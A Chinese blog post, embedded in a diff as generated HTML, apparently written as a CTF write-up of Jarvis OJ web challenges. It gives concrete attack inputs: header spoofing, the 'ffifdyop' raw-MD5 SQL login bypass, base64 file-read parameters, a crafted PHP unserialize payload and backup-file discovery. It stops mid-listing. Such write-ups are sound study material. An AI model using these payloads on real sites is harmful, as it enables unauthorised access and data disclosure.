@@ -1,0 +1,1833 @@
+<!DOCTYPE html>
+
+
+
+
+
+
+
+
+
+
+
+
+  
+
+
+<html class="theme-next gemini use-motion" lang="zh-CN">
+<head><meta name="generator" content="Hexo 3.8.0">
+  <meta charset="UTF-8">
+<meta http-equiv="X-UA-Compatible" content="IE=edge">
+<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=2">
+<meta name="theme-color" content="#222">
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+<link rel="stylesheet" href="/lib/font-awesome/css/font-awesome.min.css?v=4.6.2">
+
+<link rel="stylesheet" href="/css/main.css?v=7.0.1">
+
+
+  <link rel="apple-touch-icon" sizes="180x180" href="/images/米兔.jpg?v=7.0.1">
+
+
+  <link rel="icon" type="image/png" sizes="32x32" href="/images/favicon.ico?v=7.0.1">
+
+
+  <link rel="icon" type="image/png" sizes="16x16" href="/images/favicon16x16.ico?v=7.0.1">
+
+
+  <link rel="mask-icon" href="/images/logo.svg?v=7.0.1" color="#222">
+
+
+
+
+
+
+
+<script id="hexo.configurations">
+  var NexT = window.NexT || {};
+  var CONFIG = {
+    root: '/',
+    scheme: 'Gemini',
+    version: '7.0.1',
+    sidebar: {"position":"left","display":"post","offset":12,"onmobile":false,"dimmer":false},
+    back2top: true,
+    back2top_sidebar: true,
+    fancybox: false,
+    fastclick: false,
+    lazyload: false,
+    tabs: true,
+    motion: {"enable":true,"async":true,"transition":{"post_block":"fadeIn","post_header":"slideDownIn","post_body":"slideDownIn","coll_header":"slideLeftIn","sidebar":"slideUpIn"}},
+    algolia: {
+      applicationID: '',
+      apiKey: '',
+      indexName: '',
+      hits: {"per_page":10},
+      labels: {"input_placeholder":"Search for Posts","hits_empty":"We didn't find any results for the search: ${query}","hits_stats":"${hits} results found in ${time} ms"}
+    }
+  };
+</script>
+
+
+  
+
+
+
+
+  <meta name="description" content="Jarvis OJ Web部分题目的write up">
+<meta name="keywords" content="CTF,web,Jarvis OJ">
+<meta property="og:type" content="article">
+<meta property="og:title" content="Jarvis OJ Web">
+<meta property="og:url" content="http://miracle778.github.io/CTF/Jarvis/Web/Jarvis-OJ-Web.html">
+<meta property="og:site_name" content="Miracle778&#39;s Blog">
+<meta property="og:description" content="Jarvis OJ Web部分题目的write up">
+<meta property="og:locale" content="zh-CN">
+<meta property="og:image" content="http://miracle778.github.io/CTF/Jarvis/Web//Jarvis-OJ-Web//1.JPG">
+<meta property="og:image" content="http://miracle778.github.io/CTF/Jarvis/Web//Jarvis-OJ-Web//2.JPG">
+<meta property="og:image" content="http://miracle778.github.io/CTF/Jarvis/Web//Jarvis-OJ-Web//3.JPG">
+<meta property="og:image" content="http://miracle778.github.io/CTF/Jarvis/Web//Jarvis-OJ-Web//4.JPG">
+<meta property="og:image" content="http://miracle778.github.io/CTF/Jarvis/Web//Jarvis-OJ-Web//5.JPG">
+<meta property="og:image" content="http://miracle778.github.io/CTF/Jarvis/Web//Jarvis-OJ-Web//6.JPG">
+<meta property="og:image" content="http://miracle778.github.io/CTF/Jarvis/Web//Jarvis-OJ-Web//7.JPG">
+<meta property="og:image" content="http://miracle778.github.io/CTF/Jarvis/Web//Jarvis-OJ-Web//8.JPG">
+<meta property="og:image" content="http://miracle778.github.io/CTF/Jarvis/Web//Jarvis-OJ-Web//9.JPG">
+<meta property="og:image" content="http://miracle778.github.io/CTF/Jarvis/Web//Jarvis-OJ-Web//10.JPG">
+<meta property="og:image" content="http://miracle778.github.io/CTF/Jarvis/Web//Jarvis-OJ-Web//11.JPG">
+<meta property="og:image" content="http://miracle778.github.io/CTF/Jarvis/Web//Jarvis-OJ-Web//12.JPG">
+<meta property="og:image" content="http://miracle778.github.io/CTF/Jarvis/Web//Jarvis-OJ-Web//13.jpg">
+<meta property="og:image" content="http://miracle778.github.io/CTF/Jarvis/Web//Jarvis-OJ-Web//14.JPG">
+<meta property="og:image" content="http://miracle778.github.io/CTF/Jarvis/Web//Jarvis-OJ-Web//15.JPG">
+<meta property="og:image" content="http://miracle778.github.io/CTF/Jarvis/Web//Jarvis-OJ-Web//16.JPG">
+<meta property="og:image" content="http://miracle778.github.io/CTF/Jarvis/Web//Jarvis-OJ-Web//17.JPG">
+<meta property="og:image" content="http://miracle778.github.io/CTF/Jarvis/Web//Jarvis-OJ-Web//18.JPG">
+<meta property="og:image" content="http://miracle778.github.io/CTF/Jarvis/Web//Jarvis-OJ-Web//19.JPG">
+<meta property="og:image" content="http://miracle778.github.io/CTF/Jarvis/Web//Jarvis-OJ-Web//20.JPG">
+<meta property="og:image" content="http://miracle778.github.io/CTF/Jarvis/Web//Jarvis-OJ-Web//22.JPG">
+<meta property="og:image" content="http://miracle778.github.io/CTF/Jarvis/Web//Jarvis-OJ-Web//23.jpg">
+<meta property="og:image" content="http://miracle778.github.io/CTF/Jarvis/Web//Jarvis-OJ-Web//24.JPG">
+<meta property="og:image" content="http://miracle778.github.io/CTF/Jarvis/Web//Jarvis-OJ-Web//25.jpg">
+<meta property="og:image" content="http://miracle778.github.io/CTF/Jarvis/Web//Jarvis-OJ-Web//26.jpg">
+<meta property="og:image" content="http://miracle778.github.io/CTF/Jarvis/Web//Jarvis-OJ-Web//27.JPG">
+<meta property="og:image" content="http://miracle778.github.io/CTF/Jarvis/Web//Jarvis-OJ-Web//28.JPG">
+<meta property="og:image" content="http://miracle778.github.io/CTF/Jarvis/Web//Jarvis-OJ-Web//29.JPG">
+<meta property="og:image" content="http://miracle778.github.io/CTF/Jarvis/Web//Jarvis-OJ-Web//30.JPG">
+<meta property="og:image" content="http://miracle778.github.io/CTF/Jarvis/Web//Jarvis-OJ-Web//31.jpg">
+<meta property="og:image" content="http://miracle778.github.io/CTF/Jarvis/Web//Jarvis-OJ-Web//32.jpg">
+<meta property="og:image" content="http://miracle778.github.io/CTF/Jarvis/Web//Jarvis-OJ-Web//33.jpg">
+<meta property="og:image" content="http://miracle778.github.io/CTF/Jarvis/Web//Jarvis-OJ-Web//34.jpg">
+<meta property="og:image" content="http://miracle778.github.io/CTF/Jarvis/Web//Jarvis-OJ-Web//35.jpg">
+<meta property="og:image" content="http://miracle778.github.io/CTF/Jarvis/Web//Jarvis-OJ-Web//36.jpg">
+<meta property="og:image" content="http://miracle778.github.io/CTF/Jarvis/Web//Jarvis-OJ-Web//37.JPG">
+<meta property="og:image" content="http://miracle778.github.io/CTF/Jarvis/Web//Jarvis-OJ-Web//38.JPG">
+<meta property="og:image" content="http://miracle778.github.io/CTF/Jarvis/Web//Jarvis-OJ-Web//39.JPG">
+<meta property="og:image" content="http://miracle778.github.io/CTF/Jarvis/Web//Jarvis-OJ-Web//40.JPG">
+<meta property="og:image" content="http://miracle778.github.io/CTF/Jarvis/Web//Jarvis-OJ-Web//41.JPG">
+<meta property="og:image" content="http://miracle778.github.io/CTF/Jarvis/Web//Jarvis-OJ-Web//42.JPG">
+<meta property="og:image" content="http://miracle778.github.io/CTF/Jarvis/Web//Jarvis-OJ-Web//43.JPG">
+<meta property="og:image" content="http://miracle778.github.io/CTF/Jarvis/Web//Jarvis-OJ-Web//44.JPG">
+<meta property="og:image" content="http://miracle778.github.io/CTF/Jarvis/Web//Jarvis-OJ-Web//45.JPG">
+<meta property="og:image" content="http://miracle778.github.io/CTF/Jarvis/Web//Jarvis-OJ-Web//46.JPG">
+<meta property="og:image" content="http://miracle778.github.io/CTF/Jarvis/Web//Jarvis-OJ-Web//47.JPG">
+<meta property="og:image" content="http://miracle778.github.io/CTF/Jarvis/Web//Jarvis-OJ-Web//48.JPG">
+<meta property="og:image" content="http://miracle778.github.io/CTF/Jarvis/Web//Jarvis-OJ-Web//49.jpg">
+<meta property="og:image" content="http://miracle778.github.io/CTF/Jarvis/Web//Jarvis-OJ-Web//50.jpg">
+<meta property="og:image" content="http://miracle778.github.io/CTF/Jarvis/Web//Jarvis-OJ-Web//51.jpg">
+<meta property="og:image" content="http://miracle778.github.io/CTF/Jarvis/Web//Jarvis-OJ-Web//52.jpg">
+<meta property="og:image" content="http://miracle778.github.io/CTF/Jarvis/Web//Jarvis-OJ-Web//53.jpg">
+<meta property="og:image" content="http://miracle778.github.io/CTF/Jarvis/Web//Jarvis-OJ-Web//54.jpg">
+<meta property="og:image" content="http://miracle778.github.io/CTF/Jarvis/Web//Jarvis-OJ-Web//55.jpg">
+<meta property="og:updated_time" content="2019-05-22T07:13:45.750Z">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:title" content="Jarvis OJ Web">
+<meta name="twitter:description" content="Jarvis OJ Web部分题目的write up">
+<meta name="twitter:image" content="http://miracle778.github.io/CTF/Jarvis/Web//Jarvis-OJ-Web//1.JPG">
+
+
+
+
+
+
+  <link rel="canonical" href="http://miracle778.github.io/CTF/Jarvis/Web/Jarvis-OJ-Web.html">
+
+
+
+<script id="page.configurations">
+  CONFIG.page = {
+    sidebar: "",
+  };
+</script>
+
+  <title>Jarvis OJ Web | Miracle778's Blog</title>
+  
+
+
+
+
+
+
+
+
+
+
+
+
+  <noscript>
+  <style>
+  .use-motion .motion-element,
+  .use-motion .brand,
+  .use-motion .menu-item,
+  .sidebar-inner,
+  .use-motion .post-block,
+  .use-motion .pagination,
+  .use-motion .comments,
+  .use-motion .post-header,
+  .use-motion .post-body,
+  .use-motion .collection-title { opacity: initial; }
+
+  .use-motion .logo,
+  .use-motion .site-title,
+  .use-motion .site-subtitle {
+    opacity: initial;
+    top: initial;
+  }
+
+  .use-motion .logo-line-before i { left: initial; }
+  .use-motion .logo-line-after i { right: initial; }
+  </style>
+</noscript>
+
+</head>
+
+<body itemscope itemtype="http://schema.org/WebPage" lang="zh-CN">
+
+  
+  
+    
+  
+
+  <div class="container sidebar-position-left page-post-detail">
+    <div class="headband"></div>
+
+    <header id="header" class="header" itemscope itemtype="http://schema.org/WPHeader">
+      <div class="header-inner"><div class="site-brand-wrapper">
+  <div class="site-meta">
+    
+
+    <div class="custom-logo-site-title">
+      <a href="/" class="brand" rel="start">
+        <span class="logo-line-before"><i></i></span>
+        <span class="site-title">Miracle778's Blog</span>
+        <span class="logo-line-after"><i></i></span>
+      </a>
+    </div>
+    
+      
+        <p class="site-subtitle">人生本来就有很多事是徒劳无功呀!</p>
+      
+    
+    
+  </div>
+
+  <div class="site-nav-toggle">
+    <button aria-label="切换导航栏">
+      <span class="btn-bar"></span>
+      <span class="btn-bar"></span>
+      <span class="btn-bar"></span>
+    </button>
+  </div>
+</div>
+
+
+
+<nav class="site-nav">
+  
+    <ul id="menu" class="menu">
+      
+        
+        
+        
+          
+          <li class="menu-item menu-item-home">
+
+    
+    
+    
+      
+    
+
+    
+
+    <a href="/" rel="section"><i class="menu-item-icon fa fa-fw fa-home"></i> <br>Home</a>
+
+  </li>
+        
+        
+        
+          
+          <li class="menu-item menu-item-tags">
+
+    
+    
+    
+      
+    
+
+    
+
+    <a href="/tags/" rel="section"><i class="menu-item-icon fa fa-fw fa-tags"></i> <br>Tags</a>
+
+  </li>
+        
+        
+        
+          
+          <li class="menu-item menu-item-categories">
+
+    
+    
+    
+      
+    
+
+    
+
+    <a href="/categories/" rel="section"><i class="menu-item-icon fa fa-fw fa-th"></i> <br>Categories</a>
+
+  </li>
+        
+        
+        
+          
+          <li class="menu-item menu-item-archives">
+
+    
+    
+    
+      
+    
+
+    
+
+    <a href="/archives/" rel="section"><i class="menu-item-icon fa fa-fw fa-archive"></i> <br>Archives</a>
+
+  </li>
+        
+        
+        
+          
+          <li class="menu-item menu-item-about">
+
+    
+    
+    
+      
+    
+
+    
+
+    <a href="/about/" rel="section"><i class="menu-item-icon fa fa-fw fa-info-circle"></i> <br>About</a>
+
+  </li>
+
+      
+      
+        <li class="menu-item menu-item-search">
+          
+            <a href="javascript:;" class="popup-trigger">
+          
+            
+              <i class="menu-item-icon fa fa-search fa-fw"></i> <br>Search</a>
+        </li>
+      
+    </ul>
+  
+
+  
+
+  
+    <div class="site-search">
+      
+  <div class="popup search-popup local-search-popup">
+  <div class="local-search-header clearfix">
+    <span class="search-icon">
+      <i class="fa fa-search"></i>
+    </span>
+    <span class="popup-btn-close">
+      <i class="fa fa-times-circle"></i>
+    </span>
+    <div class="local-search-input-wrapper">
+      <input autocomplete="off" placeholder="搜索..." spellcheck="false" type="text" id="local-search-input">
+    </div>
+  </div>
+  <div id="local-search-result"></div>
+</div>
+
+
+
+    </div>
+  
+</nav>
+
+
+
+  
+
+
+
+</div>
+    </header>
+
+    
+
+
+    <main id="main" class="main">
+      <div class="main-inner">
+        <div class="content-wrap">
+          
+            
+
+          
+          <div id="content" class="content">
+            
+
+  <div id="posts" class="posts-expand">
+    
+
+  
+
+  
+  
+  
+
+  
+
+  <article class="post post-type-normal" itemscope itemtype="http://schema.org/Article">
+  
+  
+  
+  <div class="post-block">
+    <link itemprop="mainEntityOfPage" href="http://miracle778.github.io/CTF/Jarvis/Web/Jarvis-OJ-Web.html">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="name" content="Miracle778">
+      <meta itemprop="description" content>
+      <meta itemprop="image" content="/images/米兔.jpg">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="Miracle778's Blog">
+    </span>
+
+    
+      <header class="post-header">
+
+        
+        
+          <h1 class="post-title" itemprop="name headline">Jarvis OJ Web
+
+              
+            
+          </h1>
+        
+
+        <div class="post-meta">
+          <span class="post-time">
+
+            
+            
+            
+
+            
+              <span class="post-meta-item-icon">
+                <i class="fa fa-calendar-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">发表于</span>
+              
+
+              
+                
+              
+
+              <time title="创建时间：2019-05-18 14:06:08" itemprop="dateCreated datePublished" datetime="2019-05-18T14:06:08+08:00">2019-05-18</time>
+            
+
+            
+              
+
+              
+                
+                <span class="post-meta-divider">|</span>
+                
+
+                <span class="post-meta-item-icon">
+                  <i class="fa fa-calendar-check-o"></i>
+                </span>
+                
+                  <span class="post-meta-item-text">更新于</span>
+                
+                <time title="修改时间：2019-05-22 15:13:45" itemprop="dateModified" datetime="2019-05-22T15:13:45+08:00">2019-05-22</time>
+              
+            
+          </span>
+
+          
+            <span class="post-category">
+            
+              <span class="post-meta-divider">|</span>
+            
+              <span class="post-meta-item-icon">
+                <i class="fa fa-folder-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">分类于</span>
+              
+              
+                <span itemprop="about" itemscope itemtype="http://schema.org/Thing"><a href="/categories/CTF/" itemprop="url" rel="index"><span itemprop="name">CTF</span></a></span>
+
+                
+                
+                  ，
+                
+              
+                <span itemprop="about" itemscope itemtype="http://schema.org/Thing"><a href="/categories/CTF/Jarvis/" itemprop="url" rel="index"><span itemprop="name">Jarvis</span></a></span>
+
+                
+                
+                  ，
+                
+              
+                <span itemprop="about" itemscope itemtype="http://schema.org/Thing"><a href="/categories/CTF/Jarvis/Web/" itemprop="url" rel="index"><span itemprop="name">Web</span></a></span>
+
+                
+                
+              
+            </span>
+          
+
+          
+            
+            
+              
+              <span class="post-comments-count">
+                <span class="post-meta-divider">|</span>
+                <span class="post-meta-item-icon">
+                  <i class="fa fa-comment-o"></i>
+                </span>
+            
+                <span class="post-meta-item-text">评论数：</span>
+                <a href="/CTF/Jarvis/Web/Jarvis-OJ-Web.html#comments" itemprop="discussionUrl">
+                  <span class="post-comments-count valine-comment-count" data-xid="/CTF/Jarvis/Web/Jarvis-OJ-Web.html" itemprop="commentCount"></span>
+                </a>
+              </span>
+            
+          
+
+          
+          
+
+          
+            <span class="post-meta-divider">|</span>
+            <span class="post-meta-item-icon">
+            <i class="fa fa-eye"></i>
+             阅读次数： 
+            <span class="busuanzi-value" id="busuanzi_value_page_pv"></span>
+            </span>
+          
+
+          
+            <div class="post-symbolscount">
+              
+
+              
+                <span class="post-meta-item-icon">
+                  <i class="fa fa-file-word-o"></i>
+                </span>
+                
+                  <span class="post-meta-item-text">本文字数：</span>
+                
+                <span title="本文字数">17k</span>
+              
+
+              
+                <span class="post-meta-divider">|</span>
+              
+
+              
+                <span class="post-meta-item-icon">
+                  <i class="fa fa-clock-o"></i>
+                </span>
+                
+                  <span class="post-meta-item-text">阅读时长 &asymp;</span>
+                
+                <span title="阅读时长">16 分钟</span>
+              
+            </div>
+          
+
+          
+
+        </div>
+      </header>
+    
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+      
+
+      
+        <center>Jarvis OJ Web部分题目的write up</center>
+
+<a id="more"></a>
+<hr>
+<h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>前后零零碎碎算是把Jarvis OJ上面Web部分的题刷完了，收获挺多的，特此记录一下。<br>Jarvis Oj题目地址：<a href="https://www.jarvisoj.com/challenges" target="_blank" rel="noopener">https://www.jarvisoj.com/challenges</a></p>
+<hr>
+<h1 id="0x01-PORT51"><a href="#0x01-PORT51" class="headerlink" title="0x01 PORT51"></a>0x01 PORT51</h1><p>题目描述:</p>
+<blockquote>
+<p>题目链接：<a href="http://web.jarvisoj.com:32770/" target="_blank" rel="noopener">http://web.jarvisoj.com:32770/</a></p>
+</blockquote>
+<p>题目链接进去如下图，说要用51端口进行访问。<br><img src="/CTF/Jarvis/Web/\Jarvis-OJ-Web\\1.JPG" alt></p>
+<p>看到题目我的第一反应是用socket编程。后面发现不用这么麻烦，直接用<code>curl --local-port</code>即可。<br><img src="/CTF/Jarvis/Web/\Jarvis-OJ-Web\\2.JPG" alt></p>
+<hr>
+<h1 id="0x02-LOCALHOST"><a href="#0x02-LOCALHOST" class="headerlink" title="0x02 LOCALHOST"></a>0x02 LOCALHOST</h1><p>题目描述:</p>
+<blockquote>
+<p>题目链接：<a href="http://web.jarvisoj.com:32770/" target="_blank" rel="noopener">http://web.jarvisoj.com:32770/</a></p>
+</blockquote>
+<p>题目链接点进去提示说，<code>localhost access only!!</code><br><img src="/CTF/Jarvis/Web/\Jarvis-OJ-Web\\3.JPG" alt></p>
+<p>这类题目也见过挺多了，直接改请求头里的<code>X-Forwarded-For</code>即可。<br><img src="/CTF/Jarvis/Web/\Jarvis-OJ-Web\\4.JPG" alt></p>
+<hr>
+<h1 id="0x03-Login"><a href="#0x03-Login" class="headerlink" title="0x03 Login"></a>0x03 Login</h1><p>题目描述:</p>
+<blockquote>
+<p>需要密码才能获得flag哦。<br>题目链接：<a href="http://web.jarvisoj.com:32772/" target="_blank" rel="noopener">http://web.jarvisoj.com:32772/</a></p>
+</blockquote>
+<p>题目进去是一个输入框，随便输点东西试试，并没有发现什么有用的东西，于是找找源码和请求头、响应头里有没有什么提示。然后再请求头里找到Hint </p>
+<blockquote>
+<p>“select * from &#96;admin&#96; where password=’”.md5($pass,true).”‘“</p>
+</blockquote>
+<p><img src="/CTF/Jarvis/Web/\Jarvis-OJ-Web\\5.JPG" alt></p>
+<p>这里就是利用md5函数的不同输出形式。具体可参照:<a href="https://blog.csdn.net/March97/article/details/81222922" target="_blank" rel="noopener">https://blog.csdn.net/March97/article/details/81222922</a> 这里就不多讲了。</p>
+<p>只要输入特定的字符串，如可以输入<code>ffifdyop</code>和<code>129581926211651571912466741651878684928</code>即可得到flag</p>
+<p><img src="/CTF/Jarvis/Web/\Jarvis-OJ-Web\\6.JPG" alt></p>
+<hr>
+<h1 id="0x04-神盾局的秘密"><a href="#0x04-神盾局的秘密" class="headerlink" title="0x04 神盾局的秘密"></a>0x04 神盾局的秘密</h1><p>题目描述:</p>
+<blockquote>
+<p>这里有个通向神盾局内部网络的秘密入口，你能通过漏洞发现神盾局的秘密吗？<br>题目入口：<a href="http://web.jarvisoj.com:32768/" target="_blank" rel="noopener">http://web.jarvisoj.com:32768/</a></p>
+</blockquote>
+<p>点进链接去是一张图片，仔细看了一遍这张图，发现并没有什么异常。于是开始在源码和请求头里找看有没有提示。<br><img src="/CTF/Jarvis/Web/\Jarvis-OJ-Web\\7.JPG" alt></p>
+<p>然后在<code>index.php</code>的源码里发现了图片插入的标签<code>&lt;img src=showimg.php?img=c2hpZWxkLmpwZw==&gt;</code><br><img src="/CTF/Jarvis/Web/\Jarvis-OJ-Web\\8.JPG" alt></p>
+<p>这个showimg.php和img参数不免让人想到文件包含，把img参数的值base64解密一下，发现是<code>shield.jpg</code>。于是就可以确定思路，利用showimg.php显示一下index.php看看能不能得到什么信息。</p>
+<p>于是访问:<code>http://web.jarvisoj.com:32768/showimg.php?img=aW5kZXgucGhw</code>，<code>aW5kZXgucGhw是index.php的base64加密编码</code>得到下图结果。<br><img src="/CTF/Jarvis/Web/\Jarvis-OJ-Web\\9.JPG" alt></p>
+<p>这里的代码应该是<code>index.php</code>的源码，一部分在注释里，另一部分放在了html里，这里整理一下。<br><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> </span><br><span class="line"><span class="keyword">require_once</span>(<span class="string">'shield.php'</span>);</span><br><span class="line">$x = <span class="keyword">new</span> Shield();</span><br><span class="line"><span class="keyword">isset</span>($_GET[<span class="string">'class'</span>]) &amp;&amp; $g = $_GET[<span class="string">'class'</span>];</span><br><span class="line"><span class="keyword">if</span> (!<span class="keyword">empty</span>($g)) &#123;</span><br><span class="line">    $x = unserialize($g);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">echo</span> $x-&gt;readfile();</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure></p>
+<p>这代码看过去，看到shield.php和unserialize就应该明白过来，应该是要用反序列化，shield类的代码在shield.php里面，于是继续用showimg.php显示一下shield.php。<br>访问:<code>http://web.jarvisoj.com:32768/showimg.php?img=c2hpZWxkLnBocA==</code>，<code>img参数值是shield.php的base64编码</code>。</p>
+<p>得到下图结果。又是一部分代码注释另一部分放在HTML里。再次整理一下shield.php代码<br><img src="/CTF/Jarvis/Web/\Jarvis-OJ-Web\\10.JPG" alt><br><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="comment">//flag is in pctf.php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Shield</span> </span>&#123;</span><br><span class="line">    <span class="keyword">public</span> $file;</span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__construct</span><span class="params">($filename = <span class="string">''</span>)</span> </span>&#123;</span><br><span class="line">    	<span class="keyword">$this</span> -&gt;file = $filename;</span><br><span class="line">	&#125;</span><br><span class="line">		</span><br><span class="line">	<span class="function"><span class="keyword">function</span> <span class="title">readfile</span><span class="params">()</span> </span>&#123;</span><br><span class="line">		<span class="keyword">if</span> (!<span class="keyword">empty</span>(<span class="keyword">$this</span>-&gt;file) &amp;&amp; stripos(<span class="keyword">$this</span>-&gt;file,<span class="string">'..'</span>)===<span class="keyword">FALSE</span>  </span><br><span class="line">		&amp;&amp; stripos(<span class="keyword">$this</span>-&gt;file,<span class="string">'/'</span>)===<span class="keyword">FALSE</span> &amp;&amp; stripos(<span class="keyword">$this</span>-&gt;file,<span class="string">'\\'</span>==<span class="keyword">FALSE</span>) &#123;</span><br><span class="line">			<span class="keyword">return</span> @file_get_contents(<span class="keyword">$this</span>-&gt;file);</span><br><span class="line">		&#125;</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure></p>
+<p>这段代码里可以看到提示说flag在pctf.php里面，而前面index.php里最后调用的readfile函数具体实现代码也在这里。到这里就很明显了。构造数据，使得反序列化后shield的file参数为pctf.php，然后利用readfile函数输出flag。<br>生成payload。<br><img src="/CTF/Jarvis/Web/\Jarvis-OJ-Web\\11.JPG" alt></p>
+<p>最终payload为:<br><code>http://web.jarvisoj.com:32768/index.php?class=O:6:%22Shield%22:1:{s:4:%22file%22;s:8:%22pctf.php%22;}</code></p>
+<p>得到flag<br><img src="/CTF/Jarvis/Web/\Jarvis-OJ-Web\\12.JPG" alt></p>
+<hr>
+<h1 id="0x05-IN-A-Mess"><a href="#0x05-IN-A-Mess" class="headerlink" title="0x05 IN A Mess"></a>0x05 IN A Mess</h1><p>题目描述:</p>
+<blockquote>
+<p>连出题人自己都忘了flag放哪了，只记得好像很混乱的样子。<br>题目入口：<a href="http://web.jarvisoj.com:32780/" target="_blank" rel="noopener">http://web.jarvisoj.com:32780/</a></p>
+</blockquote>
+<p>这个题，前几天写SQL注入Bypass的时候写过了，这里就不多讲了。<br><a href="http://miracle778.site/Web%E5%AE%89%E5%85%A8/SQL%E6%B3%A8%E5%85%A5/SQL%E6%B3%A8%E5%85%A5%E4%B9%8BWAF-Bypass.html#more" target="_blank" rel="noopener">http://miracle778.site/Web%E5%AE%89%E5%85%A8/SQL%E6%B3%A8%E5%85%A5/SQL%E6%B3%A8%E5%85%A5%E4%B9%8BWAF-Bypass.html#more</a></p>
+<hr>
+<h1 id="0x06-RE"><a href="#0x06-RE" class="headerlink" title="0x06 RE?"></a>0x06 RE?</h1><p>题目描述:</p>
+<blockquote>
+<p>咦，奇怪，说好的WEB题呢，怎么成逆向了？不过里面有个help_me函数挺有意思的哦<br>附件链接:<a href="https://dn.jarvisoj.com/challengefiles/udf.so.02f8981200697e5eeb661e64797fc172" target="_blank" rel="noopener">https://dn.jarvisoj.com/challengefiles/udf.so.02f8981200697e5eeb661e64797fc172</a></p>
+</blockquote>
+<p>这题应该是考知识广度吧，mysql扩展函数 —- UDF</p>
+<blockquote>
+<p>有时候我们需要对表中的数据进行一些处理而内置函数不能满足需要的时候，就需要对MySQL进行一些扩展，使用者自行添加的MySQL函数就称为UDF(User Define Function)。</p>
+</blockquote>
+<p>于是只要在mysql上导入，然后调用里面函数。这里附件文件头是EIF开头，所以要在linux下的mysql使用。</p>
+<p>先在mysql命令行下用<code>select @@plugin_dir</code>查看mysql的插件目录<br><img src="/CTF/Jarvis/Web/\Jarvis-OJ-Web\\13.jpg" alt><br>然后把udf.so文件拷贝到该目录下并重命名为udf.so。然后在mysql里使用<code>create function &lt;函数名&gt; returns string soname &lt;udf文件名&gt;</code>创建外部函数。<br>如这里，题目描述里面说到有个help_me函数挺有意思，于是使用<code>create function help_me returns string soname &#39;udf.so&#39;;</code>创建help_me函数，然后使用<code>select help_me();</code>调用该函数。<br><img src="/CTF/Jarvis/Web/\Jarvis-OJ-Web\\14.JPG" alt></p>
+<p>上图是调用了help_me函数的结果，提示说用getflag函数获取flag，于是再执行一次<code>create function getflag returns string soname &#39;udf.so&#39;</code>语句，然后调用一次。<br><img src="/CTF/Jarvis/Web/\Jarvis-OJ-Web\\15.JPG" alt></p>
+<hr>
+<h1 id="0x07-flag在管理员手里"><a href="#0x07-flag在管理员手里" class="headerlink" title="0x07 flag在管理员手里"></a>0x07 flag在管理员手里</h1><p>题目描述:</p>
+<blockquote>
+<p>只有管理员才能获得flag，你能想办法获得吗？<br>题目链接：<a href="http://web.jarvisoj.com:32778/" target="_blank" rel="noopener">http://web.jarvisoj.com:32778/</a></p>
+</blockquote>
+<p>题目进去又是说只有admin能看flag，随便试一下改X-Forwarded-For 127.0.0.1，果不其然失败了。<br><img src="/CTF/Jarvis/Web/\Jarvis-OJ-Web\\16.JPG" alt></p>
+<p>不过在请求头发现了cookie的值有点东西…<br><img src="/CTF/Jarvis/Web/\Jarvis-OJ-Web\\17.JPG" alt></p>
+<p>这里把role的值url解码后，是<code>s:5:&quot;guest&quot;;</code>，是guest序列化的结果。<br>发现这个之后，肯定先把guest改一下admin试一下看看能不能成功，结果当然是失败了，因为cookie里还有另一个变量hsh，它的值是一串哈希字符串，估计是用来校验的。只改role肯定是不行，肯定要改对应的hsh。</p>
+<p>但改hsh肯定要知道他是怎么加密的，不然凭空爆破肯定是不行的。于是要找找看有没有源代码。于是用御剑扫扫后台，并没有发现什么东西，于是就只能再扫扫看有没有备份文件或者临时文件，尝试几个<code>.bak、.save、.swp、~</code>，发现<code>index.php~</code>可以访问并下载的。<br>index.php~下载下来分析，发现实质是个<code>.swp</code>vim异常退出文件，于是改个名用vim恢复一下。最终源码如下<br><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br></pre></td><td class="code"><pre><span class="line">&lt;!DOCTYPE html&gt;</span><br><span class="line">&lt;html&gt;</span><br><span class="line">&lt;head&gt;</span><br><span class="line">&lt;title&gt;Web <span 